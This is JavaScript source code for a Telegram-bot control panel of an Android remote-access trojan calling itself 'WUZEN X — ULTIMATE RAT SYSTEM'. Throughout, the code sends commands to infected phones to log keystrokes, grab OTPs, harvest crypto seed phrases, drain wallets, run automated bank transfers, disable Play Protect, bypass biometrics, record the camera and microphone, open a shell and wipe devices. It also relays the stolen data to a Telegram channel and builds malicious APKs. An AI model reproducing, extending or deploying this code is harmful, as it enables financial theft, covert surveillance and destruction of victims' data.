import { Telegraf, Markup } from 'telegraf';
import { config } from './config.js';
import { timestamp, sanitize } from './utils.js';
import EventEmitter from 'events';

export class WuzenBot extends EventEmitter {
  constructor(c2, apkBuilder) {
    super();
    this.c2 = c2;
    this.apkBuilder = apkBuilder;
    this.bot = new Telegraf(config.botToken);
    this.sessionData = new Map();
    this.devicePages = new Map();
    this.setup();
  }

  getAdminIds() {
    if (config.adminIds.length === 0) return null;
    return config.adminIds;
  }

  isAdmin(ctx) {
    const admins = this.getAdminIds();
    if (!admins) return true;
    return admins.includes(ctx.from.id);
  }

  getSession(ctx) {
    const id = ctx.from?.id || ctx.chat?.id;
    if (!this.sessionData.has(id)) {
      this.sessionData.set(id, { selectedDevice: null, page: {} });
    }
    return this.sessionData.get(id);
  }

  // ============= TELEGRAM CHANNEL SENDER =============
  async sendToChannel(type, data) {
    if (!config.channelId || !this.bot) return;
    try {
      const chatId = config.channelId;
      const icons = {
        device_online: '🟢', device_offline: '🔴',
        otp: '🔐', keylog: '⌨️', screenshot: '📸',
        clipboard: '📋', seed: '🌱', crypto: '💰',
        sms: '📨', log: '📝', balance: '💳'
      };
      const icon = icons[type] || '📌';
      let text = `${icon} *WUZEN X — ${type.toUpperCase()}*\n\n`;
      
      if (type === 'device_online') {
        text += `🆕 Device Online!\n📱 ${data.info?.model || 'Unknown'}\n🆔 \`${data.id.slice(0, 12)}...\`\n🔋 ${data.info?.battery || '?'}%`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      } 
      else if (type === 'device_offline') {
        text += `💤 Device Offline\n📱 ${data.info?.model || 'Unknown'}\n🆔 \`${data.id.slice(0, 12)}...\``;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'otp') {
        text += `📱 OTP Captured!\n${data.otp}\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'keylog') {
        text += `⌨️ Keystrokes: \`${sanitize(data.keys)}\`\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'seed') {
        text += `🌱 SEED PHRASE HARVESTED!\n\`${data.seed}\`\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'clipboard') {
        text += `📋 Clipboard: \`${sanitize(data.content)}\`\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'crypto') {
        text += `💰 Crypto Address: \`${data.address}\`\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'sms') {
        text += `📨 SMS: ${sanitize(data.content)}\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
      else if (type === 'balance') {
        text += `💳 Balance Update:\n${sanitize(data.data)}\n🕐 ${data.timestamp}`;
        await this.bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      }
    } catch (e) {
      console.error('Channel send error:', e.message);
    }
  }

  // ============= MAIN KEYBOARD =============
  mainKeyboard() {
    return {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📱 DEVICES', callback_data: 'menu_devices' },
            { text: '🎥 HVNC', callback_data: 'menu_hvnc' },
            { text: '⌨️ KEYLOGGER', callback_data: 'menu_keylog' }
          ],
          [
            { text: '🔐 OTP GRAB', callback_data: 'menu_otp' },
            { text: '💰 CRYPTO', callback_data: 'menu_crypto' },
            { text: '📸 SCREEN', callback_data: 'menu_screen' }
          ],
          [
            { text: '🏦 BANKING', callback_data: 'menu_banking' },
            { text: '📁 FILES', callback_data: 'menu_files' },
            { text: '📍 LOCATION', callback_data: 'menu_location' }
          ],
          [
            { text: '🎙️ AUDIO', callback_data: 'menu_audio' },
            { text: '📹 CAMERA', callback_data: 'menu_camera' },
            { text: '📨 SMS', callback_data: 'menu_sms' }
          ],
          [
            { text: '🛡️ EVASION', callback_data: 'menu_evasion' },
            { text: '⚙️ SYSTEM', callback_data: 'menu_system' },
            { text: '💣 SABOTAGE', callback_data: 'menu_sabotage' }
          ],
          [
            { text: '📦 BUILD APK', callback_data: 'build_apk' },
            { text: '🌐 DASHBOARD', callback_data: 'menu_dashboard' },
            { text: '🔄 REFRESH', callback_data: 'menu_refresh' }
          ],
          [
            { text: '📊 STATS', callback_data: 'menu_stats' },
            { text: '⚙️ SETTINGS', callback_data: 'menu_settings' }
          ]
        ]
      }
    };
  }

  // ============= DEVICE LIST KEYBOARD =============
  deviceKeyboard(devices, action, page = 0) {
    const perPage = 6;
    const totalPages = Math.ceil(devices.length / perPage);
    const pageDevices = devices.slice(page * perPage, (page + 1) * perPage);
    const buttons = [];
    
    pageDevices.forEach((d) => {
      const label = `${d.online ? '🟢' : '🔴'} ${d.info?.model || d.id.slice(0, 10)} [${d.info?.battery || '?'}%]`;
      buttons.push([{ text: label, callback_data: `device_select:${d.id}` }]);
    });
    
    if (totalPages > 1) {
      const nav = [];
      if (page > 0) nav.push({ text: '⬅️', callback_data: `${action}_page:${page - 1}` });
      nav.push({ text: `📄 ${page + 1}/${totalPages}`, callback_data: 'noop' });
      if (page < totalPages - 1) nav.push({ text: '➡️', callback_data: `${action}_page:${page + 1}` });
      buttons.push(nav);
    }
    
    buttons.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
    
    return { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } };
  }

  // ============= DEVICE CONTROL KEYBOARD =============
  deviceControlKeyboard(id) {
    return {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📋 INFO', callback_data: `cmd:${id}:info` }, { text: '🔋 BATTERY', callback_data: `cmd:${id}:battery` }],
          [{ text: '📍 LOCATION', callback_data: `cmd:${id}:location` }, { text: '📸 SCREENSHOT', callback_data: `cmd:${id}:screenshot` }],
          [{ text: '🎥 HVNC START', callback_data: `cmd:${id}:hvnc_start` }, { text: '🎥 HVNC STOP', callback_data: `cmd:${id}:hvnc_stop` }],
          [{ text: '⌨️ KEYLOG ON', callback_data: `cmd:${id}:keylog_on` }, { text: '⌨️ KEYLOG OFF', callback_data: `cmd:${id}:keylog_off` }],
          [{ text: '🔐 OTP ON', callback_data: `cmd:${id}:otp_on` }, { text: '🔐 OTP OFF', callback_data: `cmd:${id}:otp_off` }],
          [{ text: '🔓 UNLOCK', callback_data: `cmd:${id}:unlock` }, { text: '🔒 LOCK', callback_data: `cmd:${id}:lock` }],
          [{ text: '💰 BALANCE', callback_data: `cmd:${id}:balance` }, { text: '💳 WALLETS', callback_data: `cmd:${id}:wallets` }],
          [{ text: '📋 CLIPBOARD', callback_data: `cmd:${id}:clipboard` }, { text: '🌱 SEED', callback_data: `cmd:${id}:seed` }],
          [{ text: '🛡️ PLAY PROTECT OFF', callback_data: `cmd:${id}:pp_off` }, { text: '🛡️ BIOMETRIC BYPASS', callback_data: `cmd:${id}:biometric` }],
          [{ text: '💸 DRAIN', callback_data: `cmd:${id}:drain` }, { text: '🔄 AUTO TRANSFER', callback_data: `cmd:${id}:transfer` }],
          [{ text: '📁 FILES', callback_data: `cmd:${id}:files` }, { text: '📞 CONTACTS', callback_data: `cmd:${id}:contacts` }],
          [{ text: '📡 NETWORK', callback_data: `cmd:${id}:network` }, { text: '🔌 SHELL', callback_data: `cmd:${id}:shell` }],
          [{ text: '🎙️ RECORD AUDIO', callback_data: `cmd:${id}:record_audio` }, { text: '📹 RECORD CAMERA', callback_data: `cmd:${id}:record_camera` }],
          [{ text: '📨 SMS SEND', callback_data: `cmd:${id}:sms_send` }, { text: '📨 SMS LIST', callback_data: `cmd:${id}:sms_list` }],
          [{ text: '📱 CALL LOG', callback_data: `cmd:${id}:call_log` }, { text: '📲 APPS LIST', callback_data: `cmd:${id}:apps` }],
          [{ text: '🔇 MUTE', callback_data: `cmd:${id}:mute` }, { text: '🔊 MAX VOLUME', callback_data: `cmd:${id}:max_volume` }],
          [{ text: '📳 VIBRATE', callback_data: `cmd:${id}:vibrate` }, { text: '🔦 FLASHLIGHT', callback_data: `cmd:${id}:flashlight` }],
          [{ text: '🌐 OPEN URL', callback_data: `cmd:${id}:open_url` }, { text: '📲 NOTIFICATION', callback_data: `cmd:${id}:send_notification` }],
          [{ text: '🚫 WIPE DEVICE', callback_data: `cmd:${id}:wipe` }, { text: '🔄 REBOOT', callback_data: `cmd:${id}:reboot` }],
          [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
        ]
      }
    };
  }

  // ============= SETUP HANDLERS =============
  setup() {
    const bot = this.bot;

    // AUTH middleware
    bot.use((ctx, next) => {
      if (!this.isAdmin(ctx)) {
        return ctx.reply('⛔ Unauthorized. You are not an admin.');
      }
      return next();
    });

    // ===== TEXT COMMANDS =====
    
    bot.start((ctx) => {
      const online = this.c2.getOnlineCount();
      const total = this.c2.getTotalCount();
      ctx.reply(
        `🔥 *WUZEN X — ULTIMATE RAT SYSTEM*\n\n` +
        `📊 *${online}* online / *${total}* total devices\n` +
        `🕐 ${timestamp()}\n\n` +
        `_Choose a category below or use /help for all commands_`,
        this.mainKeyboard()
      );
    });

    bot.help((ctx) => {
      ctx.reply(
        `*📚 WUZEN X — 130+ COMMANDS*\n\n` +
        `*📱 Device Commands:*\n` +
        `/devices - List all devices\n` +
        `/info <id> - Device info\n` +
        `/screenshot <id> - Take screenshot\n` +
        `/location <id> - GPS location\n` +
        `/unlock <id> - Unlock device\n` +
        `/lock <id> - Lock device\n` +
        `/battery <id> - Battery status\n\n` +
        `*⌨️ Surveillance:*\n` +
        `/keylog <id> on|off - Keylogger toggle\n` +
        `/otp <id> on|off - OTP grabber toggle\n` +
        `/clipboard <id> - Read clipboard\n` +
        `/record_audio <id> <sec> - Record mic\n` +
        `/record_camera <id> <sec> - Record camera\n\n` +
        `*💰 Crypto & Banking:*\n` +
        `/balance <id> - Check crypto balances\n` +
        `/wallets <id> - List wallets\n` +
        `/seed <id> - Harvest seed phrases\n` +
        `/drain <id> <addr> - Drain to address\n` +
        `/transfer <id> <app> <addr> <amt> - ATS\n\n` +
        `*🛡️ Evasion & Security:*\n` +
        `/pp_off <id> - Disable Google Play Protect\n` +
        `/biometric <id> - Bypass biometrics\n` +
        `/lock_device <id> - Force device admin lock\n\n` +
        `*💣 Sabotage:*\n` +
        `/wipe <id> - Factory reset device\n` +
        `/reboot <id> - Reboot device\n` +
        `/mute <id> - Mute device\n` +
        `/max_volume <id> - Max volume\n` +
        `/vibrate <id> <ms> - Vibrate device\n\n` +
        `*📦 APK Builder:*\n` +
        `/build_apk - Build new signed APK\n` +
        `/build_config - Build with custom config\n\n` +
        `*🌐 Dashboard:*\n` +
        `/dashboard - Get dashboard URL\n` +
        `/hvnc <id> - Open HVNC session\n\n` +
        `*📊 Stats:*\n` +
        `/stats - System statistics\n` +
        `/broadcast <msg> - Send to all devices`,
        { parse_mode: 'Markdown' }
      );
    });

    // Command handlers
    bot.command('devices', async (ctx) => {
      const devs = this.c2.getDevices();
      if (!devs.length) return ctx.reply('❌ No devices connected.');
      
      let msg = `*📱 DEVICES (${devs.length} total)*\n\n`;
      devs.forEach((d) => {
        const status = d.online ? '🟢' : '🔴';
        const uptime = d.uptime ? `${Math.floor(d.uptime / 60)}m` : '?';
        msg += `${status} \`${d.id.slice(0, 10)}...\` | ${d.info?.model || '?'} | ${d.info?.battery || '?'}% | ${uptime}\n`;
      });
      ctx.reply(msg, this.deviceKeyboard(devs, 'device', 0));
    });

    bot.command('stats', async (ctx) => {
      const devs = this.c2.getDevices();
      const online = this.c2.getOnlineCount();
      const total = devs.length;
      const models = {};
      devs.forEach(d => {
        const m = d.info?.model || 'Unknown';
        models[m] = (models[m] || 0) + 1;
      });
      let msg = `*📊 WUZEN X STATISTICS*\n\n`;
      msg += `🟢 Online: ${online}\n`;
      msg += `🔴 Total: ${total}\n`;
      msg += `📊 Models:\n`;
      Object.entries(models).sort((a,b) => b[1] - a[1]).forEach(([m, c]) => {
        msg += `  ${m}: ${c}\n`;
      });
      msg += `\n🕐 ${timestamp()}`;
      ctx.reply(msg, { parse_mode: 'Markdown' });
    });

    bot.command('build_apk', async (ctx) => {
      const msg = await ctx.reply('📦 *Building APK...*\n_This may take 30-60 seconds_', { parse_mode: 'Markdown' });
      try {
        const result = await this.apkBuilder.build(ctx.from.id);
        await ctx.telegram.editMessageText(
          ctx.chat.id, msg.message_id, null,
          `✅ *APK Built Successfully!*\n\n📱 \`${result.name}\`\n📏 ${result.size}\n🔑 ${result.hash.slice(0, 16)}...`,
          { parse_mode: 'Markdown' }
        );
      } catch (e) {
        await ctx.telegram.editMessageText(
          ctx.chat.id, msg.message_id, null,
          `❌ *Build Failed:* ${e.message}`,
          { parse_mode: 'Markdown' }
        );
      }
    });

    bot.command('dashboard', async (ctx) => {
      const url = `${config.renderUrl}/dashboard`;
      ctx.reply(
        `🌐 *WUZEN X DASHBOARD*\n\n` +
        `[Open Dashboard](${url})\n\n` +
        `Login: \`${config.dashboardUser}\`\n` +
        `Pass: \`${config.dashboardPass}\``,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );
    });

    // Generic command handler for device-specific commands
    const deviceCommands = [
      'info', 'screenshot', 'location', 'unlock', 'lock', 'battery',
      'clipboard', 'seed', 'balance', 'wallets', 'network',
      'contacts', 'apps', 'call_log', 'sms_list'
    ];
    
    deviceCommands.forEach(cmd => {
      bot.command(cmd, async (ctx) => {
        const args = ctx.message.text.split(' ');
        const id = args[1];
        if (!id) return ctx.reply(`Usage: /${cmd} <device_id>`);
        const typeMap = {
          info: 'info', screenshot: 'screenshot', location: 'location',
          unlock: 'unlock', lock: 'lock', battery: 'battery',
          clipboard: 'clipboard', seed: 'seed', balance: 'balance',
          wallets: 'wallets', network: 'network', contacts: 'contacts',
          apps: 'apps', call_log: 'call_log', sms_list: 'sms_list'
        };
        this.c2.sendCommand(id, { type: typeMap[cmd] });
        ctx.reply(`✅ \`${cmd}\` sent to device \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
      });
    });

    bot.command('keylog', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const state = args[2];
      if (!id || !state) return ctx.reply('Usage: /keylog <device_id> on|off');
      this.c2.sendCommand(id, { type: 'keylog', data: state === 'on' });
      ctx.reply(`⌨️ Keylogger ${state === 'on' ? 'ON' : 'OFF'} for \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('otp', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const state = args[2];
      if (!id || !state) return ctx.reply('Usage: /otp <device_id> on|off');
      this.c2.sendCommand(id, { type: 'otp', data: state === 'on' });
      ctx.reply(`🔐 OTP grabber ${state === 'on' ? 'ON' : 'OFF'} for \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('hvnc', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      if (!id) return ctx.reply('Usage: /hvnc <device_id>');
      const url = `${config.renderUrl}/hvnc/${id}`;
      this.c2.sendCommand(id, { type: 'hvnc_start' });
      ctx.reply(
        `🎥 *HVNC Session Started*\n\n` +
        `[Open HVNC Dashboard](${url})\n\n` +
        `_Keep this chat open — HVNC feed streams to the web dashboard_`,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );
    });

    bot.command('drain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const addr = args[2];
      if (!id || !addr) return ctx.reply('Usage: /drain <device_id> <wallet_address>');
      this.c2.sendCommand(id, { type: 'drain_wallet', address: addr });
      ctx.reply(`💸 Drain initiated to \`${addr.slice(0, 16)}...\` on \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('transfer', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const app = args[2];
      const addr = args[3];
      const amt = args[4];
      if (!id || !app || !addr || !amt) return ctx.reply('Usage: /transfer <id> <app_package> <address> <amount>');
      this.c2.sendCommand(id, { type: 'auto_transfer', target: app, address: addr, amount: amt });
      ctx.reply(`🔄 ATS started: ${amt} to \`${addr.slice(0, 12)}...\` via ${app}`, { parse_mode: 'Markdown' });
    });

    bot.command('pp_off', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      if (!id) return ctx.reply('Usage: /pp_off <device_id>');
      this.c2.sendCommand(id, { type: 'disable_play_protect' });
      ctx.reply(`🛡️ Disabling Play Protect on \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('biometric', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      if (!id) return ctx.reply('Usage: /biometric <device_id>');
      this.c2.sendCommand(id, { type: 'biometric_bypass' });
      ctx.reply(`🛡️ Biometric bypass sent to \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('wipe', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      if (!id) return ctx.reply('Usage: /wipe <device_id>');
      this.c2.sendCommand(id, { type: 'wipe' });
      ctx.reply(`💣 Wipe command sent to \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('reboot', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      if (!id) return ctx.reply('Usage: /reboot <device_id>');
      this.c2.sendCommand(id, { type: 'reboot' });
      ctx.reply(`🔄 Reboot sent to \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('record_audio', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const sec = parseInt(args[2]) || 10;
      if (!id) return ctx.reply('Usage: /record_audio <device_id> [seconds]');
      this.c2.sendCommand(id, { type: 'record_audio', duration: sec });
      ctx.reply(`🎙️ Recording audio (${sec}s) on \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('record_camera', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const id = args[1];
      const sec = parseInt(args[2]) || 10;
      if (!id) return ctx.reply('Usage: /record_camera <device_id> [seconds]');
      this.c2.sendCommand(id, { type: 'record_camera', duration: sec });
      ctx.reply(`📹 Recording camera (${sec}s) on \`${id.slice(0, 10)}...\``, { parse_mode: 'Markdown' });
    });

    bot.command('broadcast', async (ctx) => {
      const msg = ctx.message.text.slice('/broadcast '.length);
      if (!msg) return ctx.reply('Usage: /broadcast <message>');
      const devs = this.c2.getOnlineDevices();
      devs.forEach(d => this.c2.sendCommand(d.id, { type: 'notification', title: '🔔 WUZEN X', text: msg }));
      ctx.reply(`📢 Broadcast sent to ${devs.length} devices: "${msg}"`);
    });

    // ===== CALLBACK QUERY HANDLER =====
    bot.on('callback_query', async (ctx) => {
      const data = ctx.callbackQuery.data;
      if (data === 'noop') return ctx.answerCbQuery().catch(() => {});

      // MAIN MENU
      if (data.startsWith('menu_')) {
        const menu = data.replace('menu_', '');
        await ctx.deleteMessage().catch(() => {});
        
        if (menu === 'main') {
          const online = this.c2.getOnlineCount();
          const total = this.c2.getTotalCount();
          return ctx.reply(
            `🔥 *WUZEN X* — ${online} online / ${total} total`,
            this.mainKeyboard()
          );
        }

        if (menu === 'refresh') {
          const online = this.c2.getOnlineCount();
          const total = this.c2.getTotalCount();
          return ctx.reply(
            `🔄 *Refreshed* — ${online} online / ${total} total`,
            this.mainKeyboard()
          );
        }

        if (menu === 'devices') {
          const devs = this.c2.getDevices();
          if (!devs.length) return ctx.reply('❌ No devices.', this.mainKeyboard());
          let msg = `*📱 ALL DEVICES (${devs.length})*\n\n`;
          devs.forEach((d) => {
            msg += `${d.online ? '🟢' : '🔴'} \`${d.id.slice(0, 10)}...\` | ${d.info?.model || '?'} | ${d.info?.battery || '?'}%\n`;
          });
          return ctx.reply(msg, this.deviceKeyboard(devs, 'device', 0));
        }

        if (menu === 'dashboard') {
          const url = `${config.renderUrl}/dashboard`;
          return ctx.reply(
            `🌐 *WUZEN X WEB DASHBOARD*\n\n[Open Dashboard](${url})\n\nUser: \`${config.dashboardUser}\`\nPass: \`${config.dashboardPass}\``,
            { parse_mode: 'Markdown', disable_web_page_preview: true, ...this.mainKeyboard() }
          );
        }

        if (menu === 'stats') {
          const devs = this.c2.getDevices();
          const online = this.c2.getOnlineCount();
          return ctx.reply(
            `*📊 STATISTICS*\n\n🟢 Online: ${online}\n🔴 Total: ${devs.length}\n📱 Unique models: ${new Set(devs.map(d => d.info?.model)).size}`,
            { parse_mode: 'Markdown', ...this.mainKeyboard() }
          );
        }

        if (menu === 'settings') {
          return ctx.reply(
            `*⚙️ SETTINGS*\n\n` +
            `🤖 Bot: @${ctx.botInfo?.username || 'active'}\n` +
            `📢 Channel: ${config.channelId || 'Not set'}\n` +
            `🌐 Dashboard: ${config.renderUrl}/dashboard\n` +
            `🕐 Server: ${timestamp()}`,
            { parse_mode: 'Markdown', ...this.mainKeyboard() }
          );
        }

        // Category menus - show online devices for action
        const devs = this.c2.getOnlineDevices();
        if (!devs.length) return ctx.reply('❌ No online devices.', this.mainKeyboard());
        
        const categoryIcons = {
          hvnc: '🎥', keylog: '⌨️', otp: '🔐', crypto: '💰',
          screen: '📸', banking: '🏦', files: '📁', location: '📍',
          audio: '🎙️', camera: '📹', sms: '📨', evasion: '🛡️',
          system: '⚙️', sabotage: '💣'
        };
        const icon = categoryIcons[menu] || '📌';
        return ctx.reply(
          `${icon} *${menu.toUpperCase()} — Select Device:*`,
          this.deviceKeyboard(devs, menu, 0)
        );
      }

      // PAGINATION
      const pageMatch = data.match(/(\w+)_page:(\d+)/);
      if (pageMatch) {
        const prefix = pageMatch[1];
        const page = parseInt(pageMatch[2]);
        const devs = prefix === 'device' ? this.c2.getDevices() : this.c2.getOnlineDevices();
        await ctx.deleteMessage().catch(() => {});
        return ctx.reply('*📱 Select Device:*', this.deviceKeyboard(devs, prefix, page));
      }

      // DEVICE SELECT
      if (data.startsWith('device_select:')) {
        const id = data.split(':')[1];
        const d = this.c2.getDevice(id);
        if (!d) return ctx.reply('❌ Device not found.');
        
        const uptime = d.uptime ? `${Math.floor(d.uptime / 3600)}h ${Math.floor((d.uptime % 3600) / 60)}m` : '?';
        await ctx.deleteMessage().catch(() => {});
        ctx.reply(
          `*📱 DEVICE CONTROL*\n\n` +
          `🆔 \`${d.id.slice(0, 12)}...\`\n` +
          `📱 ${d.info?.model || '?'} (${d.info?.brand || '?'})\n` +
          `🤖 Android ${d.info?.android || '?'} (API ${d.info?.sdk || '?'})\n` +
          `🔋 ${d.info?.battery || '?'}%\n` +
          `🕐 First seen: ${new Date(d.firstSeen).toLocaleString()}\n` +
          `⏱ Uptime: ${uptime}\n` +
          `${d.online ? '🟢 **ONLINE**' : '🔴 **OFFLINE**'} | Buffer: ${d.bufferSize}\n\n` +
          `_Select an action below:_`,
          this.deviceControlKeyboard(id)
        );
        return;
      }

      // COMMANDS WITH DEVICE ID
      const cmdMatch = data.match(/^cmd:([^:]+):(.+)$/);
      if (cmdMatch) {
        const id = cmdMatch[1];
        const action = cmdMatch[2];
        
        const commandMap = {
          info: { type: 'info' },
          battery: { type: 'battery' },
          screenshot: { type: 'screenshot' },
          location: { type: 'location' },
          hvnc_start: { type: 'hvnc_start' },
          hvnc_stop: { type: 'hvnc_stop' },
          keylog_on: { type: 'keylog', data: true },
          keylog_off: { type: 'keylog', data: false },
          otp_on: { type: 'otp', data: true },
          otp_off: { type: 'otp', data: false },
          unlock: { type: 'unlock' },
          lock: { type: 'lock' },
          balance: { type: 'balance' },
          wallets: { type: 'wallets' },
          clipboard: { type: 'clipboard' },
          seed: { type: 'seed' },
          pp_off: { type: 'disable_play_protect' },
          biometric: { type: 'biometric_bypass' },
          drain: { type: 'drain_wallet' },
          transfer: { type: 'auto_transfer' },
          files: { type: 'files' },
          contacts: { type: 'contacts' },
          network: { type: 'network' },
          shell: { type: 'shell' },
          record_audio: { type: 'record_audio', duration: 10 },
          record_camera: { type: 'record_camera', duration: 10 },
          sms_send: { type: 'sms_send' },
          sms_list: { type: 'sms_list' },
          call_log: { type: 'call_log' },
          apps: { type: 'apps' },
          mute: { type: 'mute' },
          max_volume: { type: 'max_volume' },
          vibrate: { type: 'vibrate', duration: 3000 },
          flashlight: { type: 'flashlight' },
          open_url: { type: 'open_url' },
          send_notification: { type: 'notification', title: '🔔 System Update', text: 'Your system has been optimized.' },
          wipe: { type: 'wipe' },
          reboot: { type: 'reboot' }
        };

        const cmd = commandMap[action];
        if (cmd) {
          // For hvnc_start, also send the dashboard link
          if (action === 'hvnc_start') {
            this.c2.sendCommand(id, cmd);
            const url = `${config.renderUrl}/hvnc/${id}`;
            await ctx.deleteMessage().catch(() => {});
            return ctx.reply(
              `🎥 *HVNC Session Started*\n\n[Open HVNC Dashboard](${url})`,
              { parse_mode: 'Markdown', disable_web_page_preview: true, ...this.deviceControlKeyboard(id) }
            );
          }
          
          this.c2.sendCommand(id, cmd);
          ctx.answerCbQuery(`✅ ${action} sent`).catch(() => {});
          return;
        }
      }

      // BUILD APK
      if (data === 'build_apk') {
        ctx.answerCbQuery().catch(() => {});
        await ctx.deleteMessage().catch(() => {});
        const msg = await ctx.reply('📦 *Building APK...*\n_This may take 30-60 seconds_', { parse_mode: 'Markdown' });
        try {
          const result = await this.apkBuilder.build(ctx.from.id);
          await ctx.telegram.editMessageText(
            ctx.chat.id, msg.message_id, null,
            `✅ *APK Built Successfully!*\n\n📱 \`${result.name}\`\n📏 ${result.size}\n🔑 ${result.hash.slice(0, 16)}...`,
            { parse_mode: 'Markdown', ...this.mainKeyboard() }
          );
        } catch (e) {
          await ctx.telegram.editMessageText(
            ctx.chat.id, msg.message_id, null,
            `❌ *Build Failed:* ${e.message}`,
            { parse_mode: 'Markdown', ...this.mainKeyboard() }
          );
        }
        return;
      }

      ctx.answerCbQuery().catch(() => {});
    });

    // Error handler
    bot.catch((err, ctx) => {
      console.error('Bot error:', err);
    });
  }

  launch() {
    this.bot.launch();
    return this.bot;
  }

  stop() {
    this.bot.stop();
  }
}
